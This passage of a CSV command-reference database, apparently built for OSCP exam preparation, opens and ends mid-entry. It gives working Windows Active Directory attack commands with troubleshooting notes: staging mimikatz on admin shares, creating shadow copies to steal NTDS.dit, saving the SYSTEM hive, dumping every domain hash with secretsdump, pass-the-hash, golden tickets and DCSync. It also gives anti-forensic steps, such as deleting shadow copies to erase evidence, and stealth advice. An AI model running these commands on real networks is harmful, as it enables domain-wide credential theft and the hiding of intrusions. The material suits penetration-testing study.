del \\<TARGET>\C$\Temp\mimikatz.exe after use.","high","","","","{""Access denied"": ""Need local admin for C$ write access. Test: Test-Path \\\\<TARGET>\\C$"", ""Path not found"": ""Remote directory doesn't exist. Create first: (PowerShell) New-Item -Path \\\\<TARGET>\\C$\\Temp -ItemType Directory OR use existing path like C$\\Windows\\Temp"", ""Not enough space"": ""Target disk full. Check: wmic /node:<TARGET> logicaldisk get size,freespace"", ""Network path not found"": ""SMB blocked or target offline""}","{""/Y"": ""Suppress confirmation prompt for overwriting files: copy /Y <LOCAL> \\\\<TARGET>\\C$\\<REMOTE>""}","[""test-admin-share-access""]","[""copy-file-admin-share""]",""
"ad-vssadmin-list-shadows","List Existing Shadow Copies","enumeration","vssadmin list shadows","Enumerate all existing Volume Shadow Copies on the system to identify available snapshots for file extraction.","active-directory","","ALWAYS run this first before creating new shadow copies - existing snapshots save time and reduce forensic footprint. OPSEC: Read-only operation, minimal event logging. TIME: <5 seconds. EXAM TIP: If shadow copies exist from Windows Backup/Server Manager, use those instead of creating new ones. Shadow Copy Device path format: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{NUMBER} - increment NUMBER (1, 2, 3...) for multiple copies.","high","","","","{""Access is denied"": ""Requires Administrator privileges. Run from elevated command prompt or verify membership in Backup Operators group: net localgroup Administrators"", ""No items found that satisfy the query"": ""No shadow copies exist. Either VSS disabled, no automated backups configured, or shadow copies deleted. Create new shadow copy with vssadmin or vshadow.exe."", ""The Volume Shadow Copy Service service is not started"": ""VSS service disabled. Start with: net start vss OR sc start vss. Verify service exists: sc query vss""}","{""list shadows"": ""VSS operation to enumerate all shadow copies. Shows creation time, volume name, and shadow copy device path needed for file access."", ""vssadmin"": ""Native Windows Volume Shadow Copy Service administration tool. Requires elevated privileges (Administrator or Backup Operators group).""}","","","[""ad-copy-ntds-from-shadow"", ""ad-vssadmin-create-shadow""]"
"ad-check-vss-service","Verify VSS Service Status","enumeration","sc query vss","Check if Volume Shadow Copy Service is running before attempting shadow copy operations.","active-directory","","PREREQUISITE check before shadow copy operations. TIME: <3 seconds. VSS enabled by default on Windows Server and Windows 10/11. If stopped, starting requires Administrator. MANUAL ALTERNATIVE: PowerShell: Get-Service -Name VSS | Select-Object Status, StartType, DisplayName. GUI: services.msc  Volume Shadow Copy  Status column.","medium","","","","{""STATE: STOPPED"": ""VSS service not running. Start with: net start vss OR sc start vss. Should start automatically, check dependencies if fails."", ""The specified service does not exist"": ""VSS not installed (rare, non-standard Windows build). Shadow copies impossible without VSS. Use alternative credential extraction: DCSync, LSASS dump, or SAM/SYSTEM registry extraction."", ""OpenService FAILED 1060"": ""Service name incorrect or not present. Try alternate check: Get-Service VSS (PowerShell) or services.msc GUI verification.""}","{""sc query"": ""Service Control query operation. Returns service status, type, and current state without modification."", ""vss"": ""Volume Shadow Copy Service (VSS). Service name for shadow copy backend. Display name: 'Volume Shadow Copy'. Required for all shadow copy operations.""}","","[""ad-dcsync-ntds-credentials""]","[""ad-vssadmin-list-shadows"", ""ad-vssadmin-create-shadow""]"
"ad-vssadmin-create-shadow","Create Shadow Copy with vssadmin (Native)","exploitation","vssadmin create shadow /for=<DRIVE_LETTER>:","Create Volume Shadow Copy using native Windows vssadmin utility. PREFERRED method - no tool upload required, built-in functionality.","active-directory","vssadmin create shadow /for=C:","PREFERRED METHOD for OSCP exam - native tool, no upload required, faster than transferring vshadow.exe. OPSEC: Persistent shadow copy (survives reboot) - DELETE after extraction with vssadmin delete. TIME: 10-30 seconds for creation. EXAM STRATEGY: (1) Check existing shadows first, (2) Use vssadmin if no vshadow.exe available, (3) Remember to cleanup. LIMITATION: Cannot disable VSS writers like vshadow.exe -nw, slightly slower creation. ADVANTAGE: Zero file transfer, works on all Windows Server versions, less suspicious process execution. Shadow copies consume disk space - ~10-30% of volume size, ensure adequate free space.","high","","","","{""Access is denied"": ""Requires Administrator OR SeBackupPrivilege. Verify: whoami /priv | findstr Backup. If disabled, enable: Enable-Privilege SeBackupPrivilege (PowerShell) OR runas /user:Administrator cmd"", ""Insufficient storage available"": ""Shadow copy diff area full. Check space: vssadmin list shadowstorage. Resize: vssadmin resize shadowstorage /for=C: /maxsize=20%. Alternative: Delete old shadows with vssadmin delete shadows /for=C: /oldest"", ""Shadow copy provider had an unexpected error"": ""VSS writers failed. Check writer status: vssadmin list writers. If writer errors shown, use vshadow.exe -nw (no-writers) instead OR restart VSS service: net stop vss && net start vss"", ""The specified volume was not found"": ""Invalid drive letter. List volumes: mountvol OR wmic volume get DriveLetter,DeviceID. Use correct drive letter with colon: /for=C:""}","{""create shadow"": ""VSS operation to create new shadow copy snapshot. Creates point-in-time copy of entire volume, including locked files (NTDS.dit, SAM, SYSTEM)."", ""/for"": ""Specifies target volume by drive letter. Format: /for=C: (with colon). Shadow copy captures ALL files on volume at creation moment - later file changes NOT reflected in snapshot."", ""vssadmin"": ""Native Windows utility. ADVANTAGE: No upload needed, built-in, less suspicious. LIMITATION: Cannot disable writers (slower than vshadow.exe -nw), creates persistent shadow copy (must manually delete).""}","[""ad-check-vss-service""]","[""ad-vshadow-create-shadow"", ""ad-diskshadow-create-shadow""]","[""ad-vssadmin-list-shadows"", ""ad-copy-ntds-from-shadow""]"
"ad-vshadow-create-shadow","Create Shadow Copy with vshadow.exe (SDK)","exploitation","vshadow.exe -nw -p <DRIVE_LETTER>:","Create Volume Shadow Copy using Microsoft vshadow.exe from Windows SDK. Faster than vssadmin due to -nw (no-writers) option.","active-directory","vshadow.exe -nw -p C:","METHOD FROM OFFICIAL OSCP CONTENT. ADVANTAGE: -nw flag speeds up creation significantly (5-10 seconds vs 30-60 seconds). DISADVANTAGE: Requires upload of vshadow.exe to target DC. TIME: Upload (10-30 sec) + Creation (5-10 sec) = 15-40 sec total. OPSEC: Microsoft signed binary, but file transfer creates forensic artifact. EXAM STRATEGY: Use vssadmin if vshadow.exe not available/uploaded. Download vshadow.exe: Part of Windows SDK (free), typically in C:\Program Files (x86)\Windows Kits\10\bin\<version>\x64\vshadow.exe on dev machines. Note device name from output (\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{NUMBER}) for copy command.","high","","","","{""Access is denied"": ""Requires Administrator. Verify: net user %USERNAME% | findstr /C:\""Local Group Memberships\"". Run from elevated prompt: Right-click cmd.exe \u2192 Run as administrator"", ""Unexpected error calling routine CoCreateInstance"": ""VSS COM components initialization failed. Check VSS service: sc query vss. If stopped, start: net start vss. Verify COM registration: vssadmin list providers. If no providers, VSS installation corrupt - use vssadmin instead."", ""Insufficient storage"": ""Shadow copy storage area full. Check: vssadmin list shadowstorage /for=C:. Resize: vssadmin resize shadowstorage /for=C: /maxsize=20GB. Or delete old shadows: vssadmin delete shadows /for=C: /oldest"", ""vshadow.exe is not recognized"": ""Binary not in current directory or PATH. Verify: dir vshadow.exe. If missing, re-upload or specify full path: C:\\Tools\\vshadow.exe -nw -p C:""}","{""-nw"": ""No-writers option. Disables VSS writers (application-aware snapshot components). ADVANTAGE: Significantly speeds up shadow copy creation (seconds vs minutes). SAFE for NTDS.dit extraction - database consistency handled by AD itself. Writers only needed for application-level consistency (SQL, Exchange). EXAM TIP: Always use -nw for speed."", ""-p"": ""Persistent shadow copy. Stores copy on disk (survives reboot), not in-memory. REQUIRED for file extraction - allows copy operations from shadow device. Alternative: -t (transportable) for backup scenarios."", ""vshadow.exe"": ""Microsoft signed binary from Windows SDK. REQUIRES UPLOAD to target DC. Download: Windows SDK \u2192 Debugging Tools \u2192 vshadow.exe (x64/x86). Bypasses UAC due to Microsoft signature. ALTERNATIVE: vssadmin (built-in, no upload).""}","[""ad-check-vss-service""]","[""ad-vssadmin-create-shadow"", ""ad-diskshadow-create-shadow""]","[""ad-copy-ntds-from-shadow""]"
"ad-diskshadow-create-shadow","Create Shadow Copy with diskshadow (Scriptable)","exploitation","diskshadow /s <SCRIPT_FILE>","Create Volume Shadow Copy using diskshadow with script file for automation. Native Windows utility with scriptable interface.","active-directory","diskshadow /s C:\Windows\Temp\shadow.txt","ADVANCED METHOD - scriptable and automatable. ADVANTAGE: Native Windows tool (no upload), more powerful than vssadmin (can expose shadow as drive letter Z:, easier than \\?\GLOBALROOT paths). EXAM USE CASE: Multi-DC environments where repeatable process needed. TIME: Script creation (30 sec) + Execution (10-20 sec). SCRIPT TEMPLATE:

set context persistent nowriters
set metadata C:\Windows\Temp\metadata.cab
add volume C:
create

OPTIONAL: Expose shadow as drive letter for easier access:
expose %vssc% Z:
(Then access files as Z:\Windows\NTDS\ntds.dit instead of \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\ntds.dit)

LIMITATION: More complex than vssadmin single command. OPSEC: Native tool, minimal logging. Cleanup: Delete exposed drives with: diskshadow  unexpose Z:  delete shadows volume C:  exit","medium","","","","{""The system cannot find the file specified"": ""Script file path invalid or not found. Verify: type <SCRIPT_FILE>. Check absolute path used (relative paths may fail). Create script: echo set context persistent nowriters > C:\\Temp\\shadow.txt && echo add volume C: >> C:\\Temp\\shadow.txt && echo create >> C:\\Temp\\shadow.txt"", ""Access is denied"": ""Requires Administrator. Run from elevated prompt. Verify script file location is writable (avoid C:\\Windows\\System32, use C:\\Temp or C:\\Windows\\Temp)."", ""Error during shadow copy creation"": ""Script syntax error. Common issues: (1) Missing 'set context' before 'create', (2) No volume added ('add volume' required), (3) Metadata path invalid. Test script manually: Run diskshadow.exe interactively, paste commands one-by-one."", ""The specified volume is not supported"": ""Volume type not shadow-compatible (network drive, removable media). Use local NTFS volume only. List valid volumes: diskshadow \u2192 list volumes \u2192 exit""}","{""/s"": ""Script mode. Executes diskshadow commands from text file non-interactively. Enables automation and repeatable shadow copy creation. Alternative: Interactive mode (run diskshadow.exe without args, enter commands manually)."", ""diskshadow"": ""Native Windows shadow copy scripting utility. ADVANTAGE: Built-in, scriptable, supports complex operations (expose, import, break). More powerful than vssadmin. SCRIPT COMMANDS: 'set context persistent nowriters' (equivalent to vshadow -nw -p), 'add volume C:' (select volume), 'create' (execute snapshot), 'expose %vssc% Z:' (mount as drive letter for easy access)."", ""Script file format"": ""Plain text, one command per line. Example:\nset context persistent nowriters\nset metadata C:\\Windows\\Temp\\meta.cab\nset verbose on\nadd volume C:\nbegin backup\ncreate\nend backup\n(Creates shadow copy without writers, similar to vshadow -nw -p)""}","[""ad-check-vss-service""]","[""ad-vssadmin-create-shadow"", ""ad-vshadow-create-shadow""]","[""ad-copy-ntds-from-shadow""]"
"ad-wmic-create-shadow","Create Shadow Copy with wmic (Legacy)","exploitation","wmic shadowcopy call create Volume=<DRIVE_LETTER>:\","Create Volume Shadow Copy using WMIC (Windows Management Instrumentation Command-line). Legacy method, deprecated in Windows 10/11 but works on older systems.","active-directory","wmic shadowcopy call create Volume=C:\","LEGACY METHOD - wmic deprecated, not available on modern Windows (10 21H1+, Server 2022+). ONLY USE: Older lab machines (Server 2012/2016), Windows 7/8/10 pre-21H1. EXAM RELEVANCE: LOW - OSCP labs may have newer systems without wmic. PREFER: vssadmin (native, supported) or PowerShell alternatives. TIME: 5-10 seconds. OPSEC: WMIC usage heavily logged (Process Creation Event 4688, WMI Activity 5857-5861). MODERN ALTERNATIVE: PowerShell: Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'C:\','ClientAccessible' OR Get-CimClass Win32_ShadowCopy | Invoke-CimMethod -MethodName Create -Arguments @{Volume='C:\'} (CIM cmdlets preferred over WMI). After creation, list shadow copies to get device path: wmic shadowcopy list brief OR vssadmin list shadows","low","","","","{""'wmic' is not recognized"": ""WMIC removed (Windows 10 21H1+, Server 2022+) or disabled. ALTERNATIVE: PowerShell: (Get-WmiObject -List Win32_ShadowCopy).Create('C:\\','ClientAccessible'). Or use vssadmin/diskshadow instead."", ""ReturnValue = 2"": ""Invalid Volume parameter. COMMON MISTAKE: Missing trailing backslash. FIX: Volume=C:\\ (correct) not Volume=C:. Verify syntax: wmic shadowcopy call create Volume=\""C:\\\\\"" (escaped backslash if needed)."", ""Access denied"": ""Requires Administrator. Run from elevated prompt. WMIC also requires WMI service running: sc query winmgmt. If stopped: net start winmgmt"", ""Invalid global switch"": ""Syntax error. Ensure no extra spaces: wmic shadowcopy call create Volume=C:\\ (no space before Volume). Quote if needed: wmic shadowcopy call create \""Volume=C:\\\\\""""}","{""shadowcopy call create"": ""WMIC invocation of Win32_ShadowCopy WMI class Create method. Programmatic shadow copy creation via WMI. Alternative to VSS command-line tools."", ""Volume"": ""WMI property specifying target volume. MUST include trailing backslash (C:\\). Without backslash, command fails silently. Format critical: Volume=C:\\ (correct) vs Volume=C: (incorrect)."", ""wmic"": ""Windows Management Instrumentation Command-line tool. DEPRECATED since Windows 10 21H1 / Server 2022. Removed in future Windows versions. Microsoft recommends PowerShell (Invoke-WmiMethod or Invoke-CimMethod) instead. STILL WORKS on: Windows 7/8/10 (pre-21H1), Server 2012/2016/2019.""}","[""ad-check-vss-service""]","[""ad-vssadmin-create-shadow"", ""ad-vshadow-create-shadow"", ""ad-diskshadow-create-shadow""]","[""ad-copy-ntds-from-shadow""]"
"ad-copy-ntds-from-shadow","Extract NTDS.dit from Shadow Copy","exploitation","copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<SHADOW_NUMBER>\Windows\NTDS\ntds.dit <OUTPUT_PATH>","Copy Active Directory database (NTDS.dit) from shadow copy to accessible location for offline credential extraction.","active-directory","copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\Temp\ntds.dit.bak","CRITICAL STEP for offline NTDS.dit credential extraction. TIME: 5-30 seconds (depends on file size, typically 20-500 MB). EXAM TIP: Note shadow copy number from vssadmin list shadows output - easiest to copy-paste device name rather than type manually. OPSEC: File copy generates minimal events, but extracted NTDS.dit is obvious IOC if found. Delete after parsing: del <OUTPUT_PATH>. FILE SIZE VALIDATION: NTDS.dit typically 20+ MB minimum (even small domains). If <1 MB, copy failed or wrong file. ALTERNATIVE PATHS: (1) Custom installation: Check HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\""Database log files path"". (2) IFM backup: C:\Windows\IFM\ntds.dit (if Install From Media used). TRANSFER TO KALI: SMB share, certutil base64 encoding, impacket-smbserver, or simple Python HTTP server: python3 -m http.server 8080 (then wget from Kali).","high","","","","{""The system cannot find the file specified"": ""Shadow device path incorrect. VERIFY: (1) Shadow number: vssadmin list shadows \u2192 Look for 'Shadow copy device name' \u2192 Extract number (e.g., HarddiskVolumeShadowCopy2 = number 2). (2) NTDS.dit path: May vary if custom installation. Check: dir \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<N>\\Windows\\NTDS. If not found, search: dir \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<N>\\ /s /b | findstr ntds.dit"", ""Access is denied"": ""Requires Administrator OR SeBackupPrivilege. Verify: whoami /priv | findstr Backup. If privilege disabled, enable with PowerShell: Enable-ProcessPrivilege SeBackupPrivilege. Or run from Administrator account: runas /user:Administrator cmd"", ""The system cannot find the path specified"": ""Output directory doesn't exist. Create first: mkdir C:\\Temp (or use existing directory like C:\\Users\\Public). Verify destination writable: echo test > <OUTPUT_PATH>_test.txt && del <OUTPUT_PATH>_test.txt"", ""0 file(s) copied"": ""Silent failure. Check: (1) Destination path valid (no trailing backslash for file), (2) Sufficient disk space: dir C:\\ (check bytes free), (3) NTDS.dit exists in shadow: dir \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<N>\\Windows\\NTDS\\ntds.dit""}","{""\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy"": ""Special Windows object namespace path to access shadow copy volumes. \\\\?\\ prefix bypasses Win32 file name parsing, allows long paths and special device access. GLOBALROOT exposes NT kernel object namespace. Shadow copy devices incremented: HarddiskVolumeShadowCopy1, HarddiskVolumeShadowCopy2, etc."", ""\\Windows\\NTDS\\ntds.dit"": ""Default location of Active Directory database on domain controllers. Contains ALL domain credentials (NTLM hashes, Kerberos keys), user objects, group memberships, GPOs. File locked during normal operation (cannot copy directly) - shadow copy bypasses lock by accessing point-in-time snapshot."", ""copy command"": ""Native Windows file copy. ADVANTAGE: Built-in, no upload. Can copy locked files from shadow volumes (locked in main filesystem). Alternative: robocopy (more robust, resumable), xcopy (older systems)."", ""Output path .bak extension"": ""Convention to distinguish shadow copy from live database. Prevents accidental confusion. Extension irrelevant - file is exact binary copy of NTDS.dit at shadow creation time.""}","[""ad-vssadmin-list-shadows"", ""ad-vssadmin-create-shadow""]","","[""ad-reg-save-system-hive"", ""ad-secretsdump-parse-ntds""]"
"ad-reg-save-system-hive","Save SYSTEM Registry Hive","exploitation","reg save HKLM\SYSTEM <OUTPUT_PATH>","Export SYSTEM registry hive required to decrypt NTDS.dit offline. Contains boot key (syskey) used to encrypt password hashes in NTDS database.","active-directory","reg save HKLM\SYSTEM C:\Temp\system.bak","REQUIRED for NTDS.dit decryption - cannot extract credentials without SYSTEM hive. TIME: 3-10 seconds. EXAM TIP: Save SYSTEM hive IMMEDIATELY after copying NTDS.dit (easy to forget, blocks credential extraction). FILE SIZE: ~8-15 MB typical. If <1 MB, export failed. OPSEC: Low-risk operation, standard admin task. ALTERNATIVE HIVES for different scenarios: (1) Local account extraction (workstation/server): reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak (2) LSA secrets/cached creds: reg save HKLM\SECURITY security.bak && reg save HKLM\SYSTEM system.bak (3) Domain Controller: Only SYSTEM needed for NTDS.dit. TRANSFER TO KALI: Same methods as NTDS.dit (SMB, HTTP, certutil). MANUAL ALTERNATIVE (PowerShell): reg export HKLM\SYSTEM system.reg (creates text .reg file, NOT suitable for secretsdump - must use 'reg save' binary format). CLEANUP: Delete after transfer: del C:\Temp\system.bak C:\Temp\ntds.dit.bak","high","","","","{""Access is denied"": ""Requires Administrator OR SeBackupPrivilege. Verify: whoami /priv | findstr SeBackupPrivilege. If disabled, enable: Enable-ProcessPrivilege SeBackupPrivilege (PowerShell). Or run elevated prompt: Right-click cmd \u2192 Run as administrator."", ""The system cannot find the path specified"": ""Output directory doesn't exist. Create: mkdir C:\\Temp OR use existing: C:\\Windows\\Temp, C:\\Users\\Public. Path must be absolute, not relative."", ""The process cannot access the file"": ""Output file already exists and locked/in-use. Delete first: del <OUTPUT_PATH> /F. Or use different filename: system2.bak, system_<timestamp>.bak"", ""The parameter is incorrect"": ""Invalid registry path or output path. VERIFY: (1) Hive path format: HKLM\\SYSTEM (correct) not HKEY_LOCAL_MACHINE\\SYSTEM (fails with reg save). (2) Output path no special chars: Avoid <, >, |, ? in filename.""}","{""reg save"": ""Registry export operation. Saves binary copy of registry hive to file. Binary format (NOT .reg text export) - includes SAM, SECURITY, SYSTEM hives for offline parsing. Alternative: reg export (text format, not suitable for credential extraction)."", ""HKLM\\SYSTEM"": ""HKEY_LOCAL_MACHINE\\SYSTEM hive. Contains system configuration, services, drivers, and CRITICAL: Boot Key (syskey) for NTDS.dit decryption. Boot key encrypts PEK (Password Encryption Key) stored in NTDS.dit. Without SYSTEM hive, NTDS.dit credentials cannot be decrypted."", ""SYSTEM hive structure"": ""Boot key derived from 4 registry keys (JD, Skew1, GBG, Data) in SYSTEM\\CurrentControlSet\\Control\\Lsa\\{JD,Skew1,GBG,Data} class data. Impacket's secretsdump uses boot key to decrypt NTDS.dit PEK (Password Encryption Keys List), then decrypts individual password hashes."", ""Why SYSTEM not SECURITY/SAM"": ""For NTDS.dit: Only SYSTEM needed (boot key sufficient). For local account extraction (non-DC): Need both SYSTEM + SAM (local hashes) OR SYSTEM + SECURITY (cached domain credentials, LSA secrets). DC credentials stored in NTDS.dit, not SAM/SECURITY.""}","[""ad-copy-ntds-from-shadow""]","","[""ad-secretsdump-parse-ntds""]"
"ad-secretsdump-parse-ntds","Parse NTDS.dit Offline with secretsdump","exploitation","impacket-secretsdump -ntds <NTDS_FILE> -system <SYSTEM_FILE> LOCAL","Extract all Active Directory user credentials (NTLM hashes, Kerberos keys) from offline NTDS.dit database using Impacket on Kali Linux.","active-directory","impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL","FINAL STEP - extracts ALL domain credentials offline. TIME: 10-60 seconds (depends on domain size, number of users). EXAM TIP: Pipe output to file for easy reference: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee credentials.txt. OUTPUT PARSING: (1) NTLM hashes: Fourth field (domain\user:RID:LM:NTLM:::) - use for Pass-the-Hash. (2) krbtgt hash: CRITICAL for Golden Ticket (RID 502). (3) Kerberos keys: Below main output, AES256 preferred for Kerberos attacks. (4) Machine accounts: End with $ (DC1$, WEB04$) - usually not crackable. CREDENTIAL USAGE: (1) Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt (NTLM mode 1000). (2) Pass-the-Hash: impacket-psexec -hashes :NThash administrator@target. (3) Golden Ticket: Use krbtgt hash. (4) AS-REP Roasting: Already have hashes, but Kerberos keys useful for forging tickets. FILE CLEANUP: shred -vfz ntds.dit.bak system.bak (secure delete on Kali). ALTERNATIVE TOOLS: (1) DSInternals (PowerShell): Get-ADDBAccount -All -DatabasePath ntds.dit -BootKey <bootkey>. (2) ntdsutil: Native Windows, extract to IFM format. (3) gosecretsdump: Golang version (faster for huge domains). HASH FORMAT: LM hash deprecated (aad3b...ee = empty), focus on NTLM (32 hex chars). Empty NTLM (31d6cfe0...) = blank password.","high","","","","{""NTDS database not found"": ""File path incorrect or file not transferred. VERIFY: ls -lh <NTDS_FILE> (should show 20+ MB file). Check current directory: pwd. Use absolute paths: /home/kali/loot/ntds.dit.bak OR relative: ./ntds.dit.bak"", ""SYSTEM hive not found"": ""SYSTEM file path wrong. Verify: file <SYSTEM_FILE> (should show 'MS Windows registry file'). Ensure both files in same directory: ls -lh *.bak"", ""Unable to open NTDS database"": ""NTDS.dit file corrupted during transfer OR wrong file. VERIFY: (1) File size matches source: sha256sum <NTDS_FILE> (compare with DC copy). (2) File type: file <NTDS_FILE> (should show 'Extensible storage engine'). (3) Re-transfer using different method (SMB vs HTTP vs certutil base64)."", ""Error while parsing SAM hashes"": ""Using SAM file instead of NTDS.dit (wrong file). NTDS.dit is ESE database, SAM is registry hive (different parsers). For DC: Use -ntds with NTDS.dit. For workstation/server: Use -sam <SAM> -system <SYSTEM> (no -ntds flag)."", ""No valid credentials found"": ""SYSTEM hive doesn't match NTDS.dit (from different machine/restore point). Boot key mismatch prevents PEK decryption. FIX: Re-extract BOTH files from SAME shadow copy simultaneously: copy shadow\u2192ntds.dit && reg save\u2192system, transfer together.""}","{""impacket-secretsdump"": ""Impacket tool for extracting credentials from various sources (NTDS.dit, SAM, LSA, DCSync). Python-based, Kali pre-installed (apt install impacket-scripts). Offline mode parses local files without network access to target."", ""-ntds"": ""Path to NTDS.dit database file (transferred from DC). File contains ALL domain objects, credentials, metadata. Binary ESE (Extensible Storage Engine) database format - requires parsing tools (secretsdump, ntdsutil, DSInternals PowerShell module)."", ""-system"": ""Path to SYSTEM registry hive (transferred from DC). Provides boot key (syskey) to decrypt NTDS.dit encryption. Boot key \u2192 PEK decryption \u2192 Individual hash decryption. WITHOUT SYSTEM hive, output shows encrypted hashes (useless)."", ""LOCAL"": ""Keyword instructing secretsdump to parse local files (offline mode). NO network connection to target. Alternative modes: DOMAIN/user:password@IP (live DCSync), SAM/SECURITY file parsing. LOCAL mode safest (passive, no network footprint)."", ""Output format"": ""domain\\username:RID:LMhash:NThash::: (one per line). Example: CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: LMhash field often empty (aad3b...ee = empty LM). NThash is NTLM hash for Pass-the-Hash. Also outputs Kerberos keys (AES256, AES128, DES) for Kerberos attacks.""}","[""ad-copy-ntds-from-shadow"", ""ad-reg-save-system-hive""]","",""
"ad-vssadmin-delete-shadows","Delete Shadow Copies (Cleanup)","utilities","vssadmin delete shadows /for=<DRIVE_LETTER>: /all /quiet","Remove all shadow copies from target volume to cleanup forensic artifacts after NTDS.dit extraction.","active-directory","vssadmin delete shadows /for=C: /all /quiet","CRITICAL OPSEC STEP - remove evidence of shadow copy abuse. TIME: 5-15 seconds. EXAM CONSIDERATION: Delete shadows AFTER credentials extracted and files transferred to Kali. Don't delete prematurely (may need to re-extract if transfer fails). DISK SPACE: Shadow copies consume 10-30% of volume size - deletion frees significant space. FORENSIC EVIDENCE: Shadow copy creation logs Event ID 8222 (VSS), usage logs 4663 (file access), deletion logs 8224. Deletion removes snapshots but NOT event logs (requires log clearing). ALTERNATIVES: (1) Delete oldest only: vssadmin delete shadows /for=C: /oldest /quiet (preserve recent shadows for legitimate backup). (2) Delete specific shadow: vssadmin delete shadows /shadow={GUID} (from vssadmin list shadows output). (3) PowerShell: Get-WmiObject Win32_ShadowCopy | Where-Object {$_.VolumeName -eq 'C:\\'} | ForEach-Object {$_.Delete()}. RANSOMWARE TECHNIQUE: Attackers often delete shadows to prevent recovery (vssadmin delete shadows /all /quiet). Blue team IOC: Unexpected shadow deletion, especially with /quiet flag. EXAM STRATEGY: Trade-off between stealth (delete shadows) vs backup (keep shadows for re-extraction if needed). Recommend: Keep shadows until final credential validation, then delete before moving to next target.","high","","","","{""Access is denied"": ""Requires Administrator. Verify: whoami /groups | findstr Administrators. Run from elevated prompt. Note: Even Backup Operators cannot delete shadows (creation/read only) - Administrator required for deletion."", ""No shadow copies were found"": ""Either (1) Already deleted, (2) Wrong drive letter, (3) Shadows on different volume. VERIFY: vssadmin list shadows (shows all shadows across all volumes). Check correct drive: vssadmin list shadows | findstr /C:\""Original Volume name\"""", ""Error deleting shadow copies"": ""Shadow copy in use (open file handle or backup operation). SOLUTIONS: (1) Close any open files from shadow: Close Explorer windows accessing \\\\?\\GLOBALROOT\\Device\\... paths. (2) Wait for backup operations: vssadmin list writers (check writer state). (3) Force delete specific shadow: vssadmin delete shadows /shadow={ShadowID} /quiet"", ""The shadow copy was not found"": ""Shadow ID invalid (if using /shadow= flag). List valid IDs: vssadmin list shadows \u2192 Copy GUID from 'Shadow Copy ID: {GUID}'. Use /all instead of specific ID for bulk deletion.""}","{""delete shadows"": ""VSS operation to remove shadow copies. Frees disk space (10-30% of volume size), eliminates forensic evidence of shadow copy creation/usage."", ""/for"": ""Specifies volume to delete shadows from. Deletes ONLY shadows on specified drive (prevents accidental deletion of other volume shadows like D:, E: backup volumes)."", ""/all"": ""Delete ALL shadow copies on volume (not just oldest or specific ID). Alternative: /oldest (remove only oldest shadow copy, preserve recent), /shadow={ShadowID} (delete specific shadow by ID from vssadmin list shadows)."", ""/quiet"": ""Suppress confirmation prompts. Non-interactive deletion (required for scripting). WITHOUT /quiet: User prompted 'Do you really want to delete X shadow copies? [Y/N]' for each operation. WITH /quiet: Immediate deletion, no prompts.""}","[""ad-secretsdump-parse-ntds""]","",""
"ad-dcsync-mimikatz-single-user","DCSync Single User with Mimikatz","post-exploit","mimikatz # lsadump::dcsync /domain:<DOMAIN_FQDN> /user:<TARGET_USER>","Extract password hashes and Kerberos keys for a specific domain user by impersonating a domain controller and requesting credential replication. Faster and stealthier than full domain dumps.","credential-dumping","mimikatz # lsadump::dcsync /domain:<corp.com> /user:<Administrator>","OSCP METHODOLOGY - WHEN TO USE DCSYNC:
DCSync is a POST-EXPLOITATION technique used AFTER obtaining Domain Admin or equivalent rights.

Typical OSCP exam workflow:
1.

INITIAL ACCESS:
Compromise domain-joined machine (password spray, AS-REP roast, web exploit)
2.

LOCAL PRIVILEGE ESCALATION:
Become local admin (AlwaysInstallElevated, SeImpersonate, kernel exploit)
3.

LATERAL MOVEMENT:
Move to higher-value targets (pass-the-hash, overpass-the-hash, Kerberos delegation)
4.

DOMAIN ADMIN COMPROMISE:
Obtain DA credentials (LSASS dump, credential harvesting, Kerberoasting admin account)
5.

**DCSYNC**:
Dump all domain credentials for persistence and complete control
6.

GOLDEN TICKET:
Use krbtgt hash for persistent domain-wide access

WHY DCSYNC INSTEAD OF NTDS.DIT EXTRACTION:
TRADITIONAL METHOD (NTDS.dit dump):
- Requires LOCAL ADMIN on domain controller (higher bar)
- Requires DIRECT ACCESS to DC (RDP, PSExec, WinRM)
- Generates DISK I/O (create VSS snapshot, copy NTDS.dit file)
- Slower (NTDS.dit is 100MB-10GB+, takes minutes to transfer)
- More forensic artifacts (file creation, VSS snapshot, disk access logs)

DCSYNC METHOD:
- Requires Domain Admin OR replication rights (same privilege level, different approach)
- Works REMOTELY (no need to log into DC)
- NO disk access (pure network operation over RPC)
- Faster for single users (1-5 seconds per user)
- Less forensic artifacts (appears as normal replication traffic)
- Stealthier (Event ID 4662 on DC, but replication traffic is common)

WHEN TO USE EACH:
- Use DCSync:
When you have DA rights from remote machine, want specific user hashes quickly, need stealth
- Use NTDS.dit:
When you have local admin on DC but NOT domain admin, want complete offline analysis, DCSync is detected/blocked

MANUAL ALTERNATIVES (if Mimikatz unavailable):
Impacket secretsdump (Linux):
impacket-secretsdump -just-dc-user <username> corp.com/administrator:password@DC1.corp.com
- Achieves same result as Mimikatz DCSync
- Works from Linux (Kali in OSCP exam)
- Output format:
domain\user:RID:LMhash:NThash:::
- See ad-dcsync-impacket-secretsdump-user command for details

SharpKatz (C# alternative to Mimikatz):
SharpKatz.exe --Command dcsync --User <username> --Domain corp.com --DomainController DC1.corp.com
- Modern C# implementation
- Better OPSEC (fewer signatures than Mimikatz)
- Requires .NET 4.5+

DCSYNC OUTPUT EXPLANATION:
EXAMPLE OUTPUT:
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\Administrator' will be the user account

Object RDN:
Administrator

** SAM ACCOUNT **
SAM Username:
Administrator
Account Type:
